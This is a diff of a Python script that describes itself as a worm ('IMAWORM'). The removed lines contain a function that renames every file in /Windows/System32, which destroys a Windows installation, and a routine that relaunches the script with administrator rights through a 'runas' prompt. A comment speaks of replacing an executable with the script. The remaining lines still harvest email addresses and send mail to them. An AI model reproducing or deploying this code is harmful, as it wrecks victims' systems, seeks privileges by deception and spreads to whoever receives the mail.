@@ -106,29 +106,7 @@ def sendEmail(usernames):
         # Close the port
     TIE_server.quit()
 
-def obfuscate():
-    os.chdir("/Windows/System32")
-    #https://www.geeksforgeeks.org/rename-all-file-names-in-your-directory-using-python/
-    for count, f in enumerate(os.listdir()):
-        f_name, f_ext = os.path.splitext(f)
-        f_name = "IMAWORM" + str(count)
- 
-        new_name = f'{f_name}{f_ext}'
-        os.rename(f, new_name)
 
-def is_admin():
-    try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
-    except:
-        return False
-
-if is_admin():     
-    # #3rd step = replace a Deep Executable with this file.
-    lnewlist = getEmail()
-    print(lnewlist)
-    sendEmail(lnewlist)
-    obfuscate()
-    
-else:
-    # Re-run the program with admin rights
-    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+lnewlist = getEmail()
+print(lnewlist)
+sendEmail(lnewlist)
